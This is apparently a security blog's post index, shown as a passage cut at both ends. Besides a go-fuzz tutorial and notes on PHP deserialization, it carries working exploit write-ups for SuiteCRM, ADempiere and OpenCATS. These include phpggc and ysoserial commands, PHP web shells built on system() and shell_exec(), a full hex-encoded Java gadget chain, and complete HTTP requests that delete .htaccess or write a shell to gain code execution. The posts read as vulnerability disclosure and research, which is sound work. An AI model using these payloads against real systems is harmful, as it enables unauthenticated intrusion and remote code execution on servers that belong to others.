guessed by an attacker. This can be used to fulfill the requirements of a PHAR deserialization vulnerability. An example of this can be seen below:The uploaded examplemodule.zip file will be stored within the following location. The manifest.php file itself is taken from the module.zip directory and it is also available in the same location.4) Triggering Arbitrary File DeletionWith the path of an uploaded zip file now known, a file deletion gadget being present, and functions that trigger Phar deserialization being available, it is possible to leverage these conditions to exploit a SuiteCRM installation.Using PHPGGC, an example phar file can be created as follows:./phpggc -p zip -o /tmp/malicious.zip -f ZendFramework/FD1 /tmp/test.txtThe above command will create a phar file with ZIP format and call it malicious.zip. This will insert a serialized payload of the previously mentioned zf1/zend-http POP gadget and set the $stream_name property of this serialized object to be /tmp/test.txt. Furthermore, the -f option within PHPGGC can also be used to ensure that the serialized object will be destroyed right after the unserialize() call, making the payload more reliable.Note: In order for this zip file to be accepted by the application, an example manifest.php file should also be added to the zip. This can be done as follows within Linux:zip -rv malicious.zip manifest.phpOnce uploaded, this file will now be located in the upload/upgrades/module directory.This file can now be triggered through the Backups section within the SuiteCRM admin panel.5) File Deletion to Code ExecutionBy leveraging file deletion, it is possible to delete application source code files and conduct denial of service attacks. It is also possible to leverage file deletion to execute arbitrary code execution on a SuiteCRM installation by deleting an .htaccess file and accessing uploaded files directly.The .htaccess is a distributed configuration file, and is how Apache handles configuration changes on a per directory basis. Within a SuiteCRM installation, this file disallows the direct access to directories such as /upload and /files. PHAR deserialization can be leveraged to delete this file. Furthermore, the mainfest.php mentioned previously can be used to smuggle and trigger PHP code.When a module is uploaded within the Module loader functionality, SuiteCRM expects a manifest.php to also be present. An example of this can be seen below:By default, SuiteCRM will ensure that the uploaded file must not contain any suspicious function calls such as “exec” or “system”. A full list of the blacklisted function calls can be seen here: Blacklisted FunctionsThis check does not take into account the “include” function. The include function can be used within PHP to include files (local files by default) which are executed as PHP code. So an include function can be smuggled into the manifest file which takes a user parameter (include($_GET[‘p’]);) , an uploaded file (which are renamed by SuiteCRM) can then be provided which contains malicious PHP code to achieve code execution.PHAR deserialization summarySo, to summarize, PHAR deserialization to code execution is as follows:1) Upload a file to the SuiteCRM through its normal storage functionality. In this instance the following is uploaded as shell.php: &lt;?php echo system($_GET[\"cmd\"]); ?&gt;This is renamed to the file eb7cde01-6190-9ca9-b81b-601998504b41 by the application and stored within the /var/www/html/uploads directory. This UID can be seen in the file URL: http://suitecrm.local/index.php?entryPoint=download&amp;id=eb7cde01-6190-9ca9-b81b-601998504b41&amp;type=Documents1) Upload a ZIP PHAR archive which, when triggered, will delete the .htaccess file and has a manifest.php which contains smuggled PHP code.PHPGGC can be used as follows:./phpggc -p zip -o /tmp/maliciousmodule.zip -f ZendFramework/FD1 /var/www/html/.htaccess The following code can then be added to a manifest.php file and then added to the PHAR ZIP archive.This ZIP archive can then be uploaded to the system using the module loader component.  Trigger the Phar Deserialization by calling the maliciousmodule.zip fileThe Backups area can be used to trigger Phar deserialization. The HTTP request send to the application is as follows:POST /index.php?module=Administration&amp;action=Backups HTTP/1.1Host: suitecrm.localUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:85.0) Gecko/20100101 Firefox/85.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-GB,en;q=0.5Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 119Origin: http://suitecrm.localConnection: closeReferer: http://suitecrm.local/index.php?module=Administration&amp;action=BackupsCookie: sugar_user_theme=SuiteP; ck_login_id_20=1; ck_login_language_20=en_us; EmailGridWidths=0=10&amp;1=10&amp;2=150&amp;3=250&amp;4=175&amp;5=125; PHPSESSID=6b8f472cd174d02167bc0a0c908ec9e0Upgrade-Insecure-Requests: 1backup_dir=PHAR%3A%2F%2F%2Fvar%2Fwww%2Fhtml%2Fupload%2Fupgrades%2Fmodule%2Fmaliciousmodule.zip&amp;backup_zip=s&amp;run=confirm1) Access the malicousmodule manifest file by browsing to the directory path and include the uploaded shell.php.txtNow that the .htaccess file is deleted. The upload directory is accessible. The malcioiusmodule-manifest.php is now accessible as follows:http://suitecrm.local/upload/upgrades/module/maliciousmodule-manifest.phpThe ?123 can now be specified and the shell.php.txt file can be providedhttp://suitecrm.local/upload/upgrades/module/maliciousmodule-manifest.php?123=/var/www/html/upload/eb7cde01-6190-9ca9-b81b-601998504b41The included shell.php.txt will be interpreted as code, and the cmd parameter can be provided which will be executed by the system command.http://suitecrm.local/upload/upgrades/module/maliciousmodule-manifest.php?123=/var/www/html/upload/eb7cde01-6190-9ca9-b81b-601998504b41&amp;cmd=idWrapping upTo conclude, when validating user input, precautions should be taken to ensure the checks are not case-sensitive. Furthermore, when remediating and preventing the use of Deserialization gadgets, transitive dependencies should be taken into account since they are loaded by a project through Composer’s autoloading feature. Snyk Open Source also supports PHP scanning and can be used to scan and report on well known libraries that have removed deserialization gadgets in their code."
  },
  
  {
    "title": "Fuzzing with Go-Fuzz",
    "url": "/posts/fuzzing-wit-go-fuzz/",
    "categories": "fuzzing",
    "tags": "go-fuzz",
    "date": "2021-05-04 03:25:52 +0800",
    





    
    "snippet": "Fuzzing can often be a very useful technical for finding bugs. Go-fuzz is a coverage-guided fuzzing solution for testing of Go packages. go-fuzz. This blog post will walk you through how to use it ...",
    "content": "Fuzzing can often be a very useful technical for finding bugs. Go-fuzz is a coverage-guided fuzzing solution for testing of Go packages. go-fuzz. This blog post will walk you through how to use it to find bugs.1) Installing GoOn linux, Go can be quickly installed by the following commands.$ cd /tmp$ ls$ curl -OL https://golang.org/dl/go1.15.12.linux-amd64.tar.gz$ sudo tar -C /usr/local -xvf go1.15.12.linux-amd64.tar.gz$ go version2)  Choosing a targetSome easy ways to find a target for fuzzing can be  https://pkg.go.dev/  https://github.com/trending/go  https://github.com/avelino/awesome-goFor this example, we will fuzz https://github.com/JoshVarga/svgparser3) Building pdf package for fuzzingGo-fuzz can be installed by running the following commandsgo get -u github.com/dvyukov/go-fuzz/go-fuzzgo get -u github.com/dvyukov/go-fuzz/go-fuzz-buildThis installs the latest version of go-fuzz onto your go pathThe svg target we are fuzzing can be installed by go get -u github.com/JoshVarga/svgparser which will install the svg reader onto your go path as well./home/snoopy/gowork/src/github.com/JoshVarga/svgparser❯ ls example_test.go   find.go   find_test.go   fuzz.go   LICENSE   parser.go   parser_test.go   README.md   testutils_test.go   utils❯ This will install the svg package we are fuzzing in our go path, you can now go to this directory and create a new file call fuzz.go which will contain your harness.Within Svgparser, we will try to fuzz the Parse functionhttps://github.com/JoshVarga/svgparser/blob/5eaba627a7d11a384dde3802ac251442e14d87ef/parser.go#L121To fuzz this function, we can create a fuzz function harness for go-fuzz with the same package name. (Note: your fuzz.go file should be on the same folder as the function you are fuzzing). This function must return 1 if the fuzzer should increase priority of the given input during subsequent fuzzing (for example, the input is lexically correct and was parsed successfully); -1 if the input must not be added to corpus even if gives new coverage; and 0 otherwise; other values are reserved for future use. The Fuzz function must be in a package that go-fuzz can import. This means the code you want to test can’t be in package main. Fuzzing internal packages are also supported.An examples fuzz function for fuzzing can be seen below (which is saved within /home/snoopy/gowork/src/github.com/JoshVarga/svgparser)package svgparserimport (\t\"bytes\")func Fuzz(data []byte) int {\telement,err := Parse(bytes.NewReader(data), false)\tif err != nil {\t\tif element != nil {\t\t\tpanic(\"svg != nil on error\")\t\t}\t\treturn 0\t}\treturn 1}This implements Fuzz(data []byte) function, which is an API expected by go-fuzz. once this has been done, you can go back to your working directory and use go-fuzz-build to build the archive which go-fuzz will use.❯ pwd/home/snoopy/svg_fuzz❯ go-fuzz-build github.com/JoshVarga/svgparser ✗ ls  svgparser-fuzz.zipwhich will produce svgparser-fuzz.zip archive.3) Building a corpusThe next step is to build a corpus for gofuzz to use which will be placed within your working directory. Ideally, files in the corpus are as small as possible and as diverse as possible. You can use inputs used by unit tests, examples and/or generate them manually. Go-fuzz by default will deduplicate and minimize the inputsGo-fuzz will also add own inputs to the corpus directory. Furthermore, the go-fuzz-corpus repository contains a bunch of examples of test functions and initial input corpuses for various packages. https://github.com/dvyukov/go-fuzz-corpus.In this instance, example svg files can be taken from https://github.com/strongcourage/fuzzing-corpusAnother option would be to create an example svg file and use radamsa to mutate the files to create some examples. Gofuzz will also mutate the files given and create more files for your corpusThese files can be taken and copied to a folder called corpus within you fuzzing directory.3) Fuzzinggoing back to your working directory, you can now start gofuzz: go-fuzz -bin=svgparser-fuzz.zip -workdir=. The working directory here should contain a folder corpus with all the svg files your previous found.As long as you don’t delete working directory, you can stop and re-start go-fuzz and it will restart where it stopped. Found crashes will be logged in crashers directory.  workers means number of tests running in parallel (set with -procs flag).  corpus is current number of interesting inputs the fuzzer has discovered, time in brackets says when the last interesting input was discovered  crashers is number of discovered bugs (check out workdir/crashers dir).  restarts is the rate with which the fuzzer restarts test processes.  cover is number of bits set in a hashed coverage bitmap4) Triaging CrashesFor any unique crashes, these will be logged within your crashers directory❯ cd crashers/❯ ls 0106e07494ad508ca0ec6e32d0ae9ac7bb932de7          4465097c05a30de5b06942b3f02e4e196276ae49          88ffb7f7327afe041ac722aaccc9b248b1a12524          c5f797d236f6199102cc91083335469aac76cece 0106e07494ad508ca0ec6e32d0ae9ac7bb932de7.output   4465097c05a30de5b06942b3f02e4e196276ae49.output   88ffb7f7327afe041ac722aaccc9b248b1a12524.output   c5f797d236f6199102cc91083335469aac76cece.output 0106e07494ad508ca0ec6e32d0ae9ac7bb932de7.quotedThese will be the format, fuzz input which is the input used to fuzz the file, the .quoted file contains the input quoted as a string and the .output file contains the crash dumpExample:❯ cat 0106e07494ad508ca0ec6e32d0ae9ac7bb932de7&lt;svg xmlns=\"htt00000000000000000000000\"&gt;00&lt;/svg&gt;0❯ cat 0106e07494ad508ca0ec6e32d0ae9ac7bb932de7.quoted \t\"&lt;svg xmlns=\\\"htt00000\" +\t\"000000000000000000\\\"&gt;\" +\t\"00&lt;/svg&gt;0\"❯ cat 0106e07494ad508ca0ec6e32d0ae9ac7bb932de7.output SVG width: panic: runtime error: index out of range [0] with length 0This can then be triaged by creating a small program with the input, and using a go debugger to see the stack properly and what part of the code is crashing.Another option is also to use libfuzzergo-fuzz-build -libfuzzer -o svg.a .go-fuzz-build -libfuzzer -o svg.a .clang -fsanitize=fuzzer svg.a -o fuzz_svg./fuzz_svg corpus_folderFurther Reading  Learning Go-Fuzz 1: iprange  Learning Go-Fuzz 2: goexif2  Going down the rabbit hole with go-fuzz  Introduction to Go fuzzing: fuzz your first project in a few minutes"
  },
  
  {
    "title": "ADempiere Unsafe Deserialization to Code Execution",
    "url": "/posts/09_adempierie_java_deserialization/",
    "categories": "web application security",
    "tags": "java deserialization",
    "date": "2021-04-15 03:25:52 +0800",
    





    
    "snippet": "IntroductionDeserializing user-controlled object streams at runtime can allow attackers to execute arbitrary code on the server, abuse application logic, and/or lead to denial of serviceJava serial...",
    "content": "IntroductionDeserializing user-controlled object streams at runtime can allow attackers to execute arbitrary code on the server, abuse application logic, and/or lead to denial of serviceJava serialization turns object graphs into byte streams containing the objects themselves and the necessary metadata to reconstruct them from the byte stream. Developers can create custom code to aid in the process of deserializing Java objects, where they may even replace the deserialized objects with different objects, or proxies. The customized deserialization process takes place during objects reconstruction before the objects are returned to the application and cast into expected types. By the time developers try to enforce an expected type, code may have already been executed.Adempiere is vulnerable to unauthenticated Java Deserialization which can result in code execution.Technical Details - AnalysisWithin Adempiere, an unauthenticated deserialization vulnerability exists within MIssue.java. The create method within MIssue.java is used to create and report issue, and the Java.io.ObjectInputStream.readObject() method is used to achieve this without any validation or whitelisting of classes from the datastream.This method is used by IssueReportServlet which takes a user parameter called ISSUE can contain serialized data within ASCII hex encoding.This issuestring data is then sent to the create method for deserialization.Technical Details - ExploitationThis can be leveraged by an attacker for code execution through unsafe deserialization. The following libraries are used by Adempire for various tasks within the project, and as such are availiable within the Java runtime’s classpath.ysoserial is used to speed up the exploitation process and generate a gadget chain that can be used to execute arbritary code on a machine using Adempire. java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 \"touch /tmp/test.txt\" | xxdThis serialized object can now be sent as a parameter to the application to create a file called test.txt under the tmp directory.https://target.local:4447/wstore/issueReportServlet?ISSUE=aced0005737200176a6176612e7574696c2e5072696f72697479517565756594da30b4fb3f82b103000249000473697a654c000a636f6d70617261746f727400164c6a6176612f7574696c2f436f6d70617261746f723b7870000000027372002b6f72672e6170616368652e636f6d6d6f6e732e6265616e7574696c732e4265616e436f6d70617261746f72e3a188ea7322a4480200024c000a636f6d70617261746f7271007e00014c000870726f70657274797400124c6a6176612f6c616e672f537472696e673b78707372003f6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e636f6d70617261746f72732e436f6d70617261626c65436f6d70617261746f72fbf49925b86eb13702000078707400106f757470757450726f706572746965737704000000037372003a636f6d2e73756e2e6f72672e6170616368652e78616c616e2e696e7465726e616c2e78736c74632e747261782e54656d706c61746573496d706c09574fc16eacab3303000649000d5f696e64656e744e756d62657249000e5f7472616e736c6574496e6465785b000a5f62797465636f6465737400035b5b425b00065f636c6173737400125b4c6a6176612f6c616e672f436c6173733b4c00055f6e616d6571007e00044c00115f6f757470757450726f706572746965737400164c6a6176612f7574696c2f50726f706572746965733b787000000000ffffffff757200035b5b424bfd19156767db37020000787000000002757200025b42acf317f8060854e00200007870000006a7cafebabe0000003200390a0003002207003707002507002601001073657269616c56657273696f6e5549440100014a01000d436f6e7374616e7456616c756505ad2093f391ddef3e0100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c6501000474686973010013537475625472616e736c65745061796c6f616401000c496e6e6572436c61737365730100354c79736f73657269616c2f7061796c6f6164732f7574696c2f4761646765747324537475625472616e736c65745061796c6f61643b0100097472616e73666f726d010072284c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b5b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b2956010008646f63756d656e7401002d4c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b01000868616e646c6572730100425b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b01000a457863657074696f6e730700270100a6284c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f64746d2f44544d417869734974657261746f723b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b29560100086974657261746f720100354c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f64746d2f44544d417869734974657261746f723b01000768616e646c65720100414c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b01000a536f7572636546696c6501000c476164676574732e6a6176610c000a000b07002801003379736f73657269616c2f7061796c6f6164732f7574696c2f4761646765747324537475625472616e736c65745061796c6f6164010040636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f72756e74696d652f41627374726163745472616e736c65740100146a6176612f696f2f53657269616c697a61626c65010039636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f5472616e736c6574457863657074696f6e01001f79736f73657269616c2f7061796c6f6164732f7574696c2f476164676574730100083c636c696e69743e0100116a6176612f6c616e672f52756e74696d6507002a01000a67657452756e74696d6501001528294c6a6176612f6c616e672f52756e74696d653b0c002c002d0a002b002e010013746f756368202f746d702f746573742e74787408003001000465786563010027284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f50726f636573733b0c003200330a002b003401000d537461636b4d61705461626c6501001d79736f73657269616c2f50776e6572333333303639363733373339363601001f4c79736f73657269616c2f50776e657233333330363936373337333936363b002100020003000100040001001a000500060001000700000002000800040001000a000b0001000c0000002f00010001000000052ab70001b100000002000d0000000600010000002f000e0000000c000100000005000f003800000001001300140002000c0000003f0000000300000001b100000002000d00000006000100000034000e00000020000300000001000f0038000000000001001500160001000000010017001800020019000000040001001a00010013001b0002000c000000490000000400000001b100000002000d00000006000100000038000e0000002a000400000001000f003800000000000100150016000100000001001c001d000200000001001e001f00030019000000040001001a00080029000b0001000c00000024000300020000000fa70003014cb8002f1231b6003557b1000000010036000000030001030002002000000002002100110000000a000100020023001000097571007e0010000001d4cafebabe00000032001b0a0003001507001707001807001901001073657269616c56657273696f6e5549440100014a01000d436f6e7374616e7456616c75650571e669ee3c6d47180100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c6501000474686973010003466f6f01000c496e6e6572436c61737365730100254c79736f73657269616c2f7061796c6f6164732f7574696c2f4761646765747324466f6f3b01000a536f7572636546696c6501000c476164676574732e6a6176610c000a000b07001a01002379736f73657269616c2f7061796c6f6164732f7574696c2f4761646765747324466f6f0100106a6176612f6c616e672f4f626a6563740100146a6176612f696f2f53657269616c697a61626c6501001f79736f73657269616c2f7061796c6f6164732f7574696c2f47616467657473002100020003000100040001001a000500060001000700000002000800010001000a000b0001000c0000002f00010001000000052ab70001b100000002000d0000000600010000003c000e0000000c000100000005000f001200000002001300000002001400110000000a000100020016001000097074000450776e72707701007871007e000d78The created file can be seen below.Multiple other vulnerabilities also exist within ADempierie.Cross-Site ScriptingIt is possible to inject malicious JavaScript into the name parameter of a user profile.This will stored within the application, and is returned back within the wstore java servlet. An example of this can be seen below.Command Injection (Windows Only)A command injection vulnerability exists when attachments are opened with a malicious filename under the windows environment.The filename parameter being concatenated can be seen below."
  },
  
  {
    "title": "OpenCATS PHP Object Injection to Arbitrary File Write",
    "url": "/posts/09_opencats_php_object_injection/",
    "categories": "web application security",
    "tags": "php deserialization",
    "date": "2021-01-17 03:25:52 +0800",
    





    
    "snippet": "IntroductionOpenCATS is an application tracking system that is written in PHP. More about OpenCATS can be seen here: https://www.opencats.org/. OpenCATS is vulnerable to PHP Object injection, by le...",
    "content": "IntroductionOpenCATS is an application tracking system that is written in PHP. More about OpenCATS can be seen here: https://www.opencats.org/. OpenCATS is vulnerable to PHP Object injection, by leveraging this vulnerability, it is possible to conduct arbitrary file write and execute arbitrary code on a system.Technical DetailsOpenCATS has an activity area to keep track of activities.The following request is being sent to the application as part of a normal application workflow.The parametersactivity:ActivityDataGrid parameter is sending serialized data as seen below which is being deserialized by the application using the unserialize function.a:9:{s:10:\"rangeStart\";i:0;s:10:\"maxResults\";i:15;s:13:\"filterVisible\";b:0;s:9:\"startDate\";s:0:\"\";s:7:\"endDate\";s:0:\"\";s:6:\"period\";s:37:\"DATE_SUB(CURDATE(), INTERVAL 1 MONTH)\";s:6:\"sortBy\";s:15:\"dateCreatedSort\";s:13:\"sortDirection\";s:4:\"DESC\";s:11:\"filterAlpha\";s:1:\"L\";}The unserialize function can be seen in DataGrid.phphttps://github.com/opencats/OpenCATS/blob/develop/lib/DataGrid.php#L272To exploit with vulnerability, a POP gadget chain can be created using guzzlehttp. A __destruct magic method available within /var/www/public/vendor/guzzlehttp/guzzle/src/Cookie/FileCookieJar.php can be leveraged to write arbitrary files to the system.The relevant code that needs to be triggered can be seen below:  public function __destruct()    {        $this-&gt;save($this-&gt;filename);    }    /**     * Saves the cookies to a file.     *     * @param string $filename File to save     * @throws \\RuntimeException if the file cannot be found or created     */    public function save($filename)    {        $json = [];        foreach ($this as $cookie) {            /** @var SetCookie $cookie */            if (CookieJar::shouldPersist($cookie, $this-&gt;storeSessionCookies)) {                $json[] = $cookie-&gt;toArray();            }        }        $jsonStr = \\GuzzleHttp\\json_encode($json);        if (false === file_put_contents($filename, $jsonStr)) {            throw new \\RuntimeException(\"Unable to save file {$filename}\");        }    }In the above example, the destruct() magic method calls the save() method on the FileCookieJar class. The save method take a value called filename which is a property of an object, The contents of th is file comes from the $json array which get the value from $cookie-&gt;toArray(), and $cookie being an object.Multiple checks are also done to ensure that $cookie-&gt;getExpires() returns true and $cookie-&gt;getDiscard() returns false. After these checks, The $json array is then json encoded and written to a file using the file_put_contents function.This is an already known gadget found by cf which is available within Guzzle versions 6.0.0 &lt;= 6.3.3+phpggc can be used to generate a serialized exploit payload for this gadgetA payload such as &lt;?php echo shell_exec($_GET['e'].' 2&gt;&amp;1'); ?&gt; can now be used with phpggc to generate a serialized gadget chain which will store shell.php within /var/www/public/shell.php of the target OpenCAT system.💻  📂  🍣 master ❯ ./phpggc -u --fast-destruct Guzzle/FW1 /var/www/public/shell.php  /tmp/shell.php a%3A2%3A%7Bi%3A7%3BO%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A25%3A%22%2Fvar%2Fwww%2Fpublic%2Fshell.php%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A3%3A%7Bs%3A7%3A%22Expires%22%3Bi%3A1%3Bs%3A7%3A%22Discard%22%3Bb%3A0%3Bs%3A5%3A%22Value%22%3Bs%3A45%3A%22%3C%3Fphp+echo+shell_exec%28%24_GET%5B%27e%27%5D.%27+2%3E%261%27%29%3B+%3F%3E%22%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3B%7Di%3A7%3Bi%3A7%3B%7DThe request with the payload can now be sent.GET /index.php?m=activity&amp;parametersactivity%3AActivityDataGrid=a%3A2%3A%7Bi%3A7%3BO%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A25%3A%22%2Fvar%2Fwww%2Fpublic%2Fshell.php%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A3%3A%7Bs%3A7%3A%22Expires%22%3Bi%3A1%3Bs%3A7%3A%22Discard%22%3Bb%3A0%3Bs%3A5%3A%22Value%22%3Bs%3A45%3A%22%3C%3Fphp+echo+shell_exec%28%24_GET%5B%27e%27%5D.%27+2%3E%261%27%29%3B+%3F%3E%22%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3B%7Di%3A7%3Bi%3A7%3B%7D HTTP/1.12Host: dvws.localUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-GB,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeReferer: http://dvws.local/index.php?m=activityCookie: _pc_tvs=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2MDkzNjMwNTYsInB0ZyI6eyJjbWY6c2ciOnsiODYwIjoxLCIxMDA3IjoxfSwiX2MiOjE2MDkzNTgwMjEsIl91IjoxNjA5MzU5MzI3fSwiZXhwIjoxNjQwODk5MDU2fQ.OFq8osGBuTAJUengo4LZey2wBuonlgwGBvwJ327pHbQ; _pc_vis=da58a38788948fae; _ga=GA1.2.1963052574.1609358122; sugar_user_theme=SuiteP; ck_login_id_20=1; ck_login_language_20=en_us; EmailGridWidths=0=10&amp;1=10&amp;2=150&amp;3=250&amp;4=175&amp;5=125; Users_divs=Users_aclroles_v%3Dtrue%23undefined%3D%23; ProspectLists_divs=ProspectLists_contacts_v%3Dtrue%23undefined%3D%23ProspectLists_prospects_v%3Dtrue%23; CATS=0cf6e6265f75d23a9abbcf8d70091118Upgrade-Insecure-Requests: 1The shell.php can now be leveraged to execute arbitrary code.Note: Multiple other areas within OpenCATs are also taking deserialized user input which can be leveraged for the same vulnerability. Also, Multiple Cross-site Scripting (XSS) issues also exist on this codebase.I’ve opened a GitHub issue to report this issue and CVE has assigned two CVEs as well: CVE-2021-25294 and CVE-2021-25295"
  },
  
  {
    "title": "PHP Object Injection Exploitation Notes",
    "url": "/posts/02_php_object_injection_exploitation-notes/",
    "categories": "web application security",
    "tags": "php deserialization",
    "date": "2021-01-09 03:25:52 +0800",
    





    
    "snippet": "Notes I’ve written and Collected about PHP DeserializationIntroductionserialize and unserializeSerialization functions are commonly used within software to store data to a file, a memory buffer, or...",
    "content": "Notes I’ve written and Collected about PHP DeserializationIntroductionserialize and unserializeSerialization functions are commonly used within software to store data to a file, a memory buffer, or transmitted across to another network which can then be deserialized at a later date. Within PHP, The serialize() function can be used to convert a value to an serialized object. This function can be used to convert a value/object to a serialized value. An example of this can be seen below:&lt;?phpclass Test{    public $name = \"Snoopy\";    public $age = 0.1;    public $secret = 0;    public $hobbies = array(\"bughunting\", \"softwaresecurity\");    public $bug_hunter = True;}$object = new Test();$serialized = serialize($object);echo $serialized;?&gt;The serialized form of the above object can be seen asO:4:\"Test\":5:{s:4:\"name\";s:6:\"Snoopy\";s:3:\"age\";d:0.1;s:6:\"secret\";i:0;s:7:\"hobbies\";a:2:{i:0;s:10:\"bughunting\";i:1;s:16:\"softwaresecurity\";}s:10:\"bug_hunter\";b:1;}This structure can be understood as:  O:Length of Object name :”Class Name”:Number of Properties in Class:{Properties} - O:4:\"Test\":5  { data } - Denotes the data structure of the object with the 5 properties - $name, $age, $secret, $hobbies, $bug_hunter  s:Length of the String:”String Value”; - s:4:\"name\";s:6:\"Snoopy\";  d:Float; - s:3:”age”;d:0.1;`  i:Integer; - s:6:\"secret\";i:0;  a:Number of Elements:{Elements} - a:2:{i:0;s:10:\"bughunting\";i:1;s:16:\"softwaresecurity\";}  b:boolean; - s:10:\"bug_hunter\";b:1;This can be converted back to an object from using the unserialize() function. unserialize has two parameters:unserialize ( string $data , array $options = [] ) : mixed  The $data parameter takes a serialized string that can be deserialized  The $options array can be used to specify allowed_classes. allowed_classes can be used to whitelist class names that should be accepted. If this is used and unserialize() encounters an object of a class that isn’t to be accepted, then the object will be instantiated as a __PHP_Incomplete_Class instead.&lt;?php$object = 'O:4:\"Test\":5:{s:4:\"name\";s:6:\"Snoopy\";s:3:\"age\";d:0.1;s:6:\"secret\";i:0;s:7:\"hobbies\";a:2:{i:0;s:10:\"bughunting\";i:1;s:16:\"softwaresecurity\";}s:10:\"bug_hunter\";b:1;}';$unserialized = unserialize(var_dump($object));echo $unserialized;?&gt;During deserialization, unserialize will take the user input, this input will have some objects along with the class and the properties of that object, and will create an instance of the provided class and object in memory (Object Instantiation) and creates a copy of the originally serialized object. As per PHP documentation, after successfully reconstructing the object, PHP will automatically attempt to call the the __wakeup() magic method as well (if one exists) and execute code in that function if it is defined for the class. This function can reconstruct any resources that the object may have. The intended use of __wakeup() is to reestablish any database connections that may have been lost during serialization and perform other reinitialization tasks. Once this is done, then the __destruct() magic method of that class will be called to when no reference to the deserialized object instance exists.serialize() will save all properties in the object and the class the object belongs to during serialization but no methods of the class of the object will be stored. As such, when unserialize is triggered, the class of the object will have to be defined in advance in code (definition of the class needs to be present in the file unserialize() is called in), or through autoloading. If the class is not already defined in the file, the object will be instantiated as __PHP_Incomplete_Class, which has no methods.Object InjectionPHP Object Injection/Unserialization happens when untrusted user input is being executed by the unserialize function which can result in code being loaded and executed due to object instantiation and autoloading, and a malicious user may be able to exploit this.This was initially made public by Stefan Esser  https://owasp.org/www-pdf-archive/Utilizing-Code-Reuse-Or-Return-Oriented-Programming-In-PHP-Application-Exploits.pdf  https://owasp.org/www-pdf-archive/POC2009-ShockingNewsInPHPExploitation.pdf  https://wiki.php.net/rfc/secure_unserializeRequirements for a Successful Exploit  PHP Magic Methods - The codebase/application being exploited needs to have interesting magic methods that can then be triggered through a POP chain.  The POP gadget chain/object being called must be declared during when unserialize is being called ( include() or require()) or object autoloading (through composer (require DIR . '/vendor/autoload.php';) or generic autoloading) must be supported for the target classes when unserialize() is being executedPHP Magic MethodsPHP Magic Methods are PHP classes that have magical properties in PHP. You cannot have functions with these names in any of your classes unless you want the magic functionality associated with them. More about this can be read from here: PHP Magic Methods Documentation. During exploitation, these magic methods can be invoked by crafting a PHP POP gadget. This is because these methods are executed automatically when unserialize() is called on an object.Magic Methods most useful for exploitation  __toString() - Invoked when object is converted to a string. (by echo for example)  __destruct() - Invoked when an object is deleted. When no reference to the deserialized object instance exists, __destruct() is called.  __wakeup()\t- Invoked when an object is unserialized. automatically called upon object deserialization.  __call() - will be called if the object will ca1ll an inexistent functionMagic Methods that could be useful for exploitation (Not useful in Most Cases)  __set() - called if the object try to access inexistent class variables  __isset()  __invoke()  __unset()  __set_state()  __callStatic()  __sleep() - called when an object is serialized (with serialize)  __clone()  __get()\t- called if the object try to access inexistent class variables  ` __debugInfo()`  __construct() - Invoked when an object is created (constructor)PHPGCCPHPGGC is a library of unserialize() payloads along with a command-line program. This can be used to generate POP gadgets from known libraries people have already found. PHPGGC supports gadget chains such as CodeIgniter4, 